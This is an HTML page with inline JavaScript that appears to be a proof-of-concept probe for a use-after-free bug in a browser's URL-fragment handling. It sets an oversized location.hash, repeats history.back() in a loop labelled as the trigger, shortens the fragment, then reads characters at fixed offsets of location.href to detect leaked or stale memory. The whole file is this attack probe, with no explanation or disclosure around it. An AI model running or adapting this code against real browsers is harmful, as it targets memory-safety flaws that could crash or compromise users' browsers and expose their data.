<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Fragment UAF – Slot Boundary Probe</title>
<style>
body { font-family: monospace; background:#000; color:#0f0; }
button { padding:10px; margin:10px; }
pre { white-space: pre-wrap; }
</style>
</head>
<body>

<h3>Fragment / String UAF – Boundary Probe</h3>
<button onclick="run()">RUN TEST</button>
<pre id="log"></pre>

<script>
const log = m => logEl.textContent += m + "\n";
const logEl = document.getElementById("log");

async function triggerUAF() {
    log("=== UAF TRIGGER START ===");
    for (let i = 0; i < 48; i += 6) {
        history.back();
        await new Promise(r => setTimeout(r, 0));
        log("[ITER " + i + "] back()");
    }
    log(">>> UAF WINDOW <<<");
}

function probe(label, s) {
    log("\n[" + label + "] URL.length = " + s.length);
    [16,32,48,64,96,128,256,512,1024].forEach(i=>{
        try {
            log("charCodeAt(" + i + ") = " + s.charCodeAt(i));
        } catch(e) {
            log("charCodeAt(" + i + ") = EXC");
        }
    });
}

async function run() {
    logEl.textContent = "";

    // Setup fragment
    let big = "A".repeat(340000);
    location.hash = big;

    let s = location.href;
    probe("BASELINE", s);

    await triggerUAF();

    // Critical collapse
    location.hash = "#X";
    log("\n>>> FRAGMENT COLLAPSE <<<");

    probe("POST-COLLAPSE (SAME FRAME)", location.href);

    // Delayed read
    setTimeout(()=>{
        probe("POST-COLLAPSE (DELAYED)", location.href);
        log("\n=== TEST END ===");
    }, 0);
}
</script>

</body>
</html>
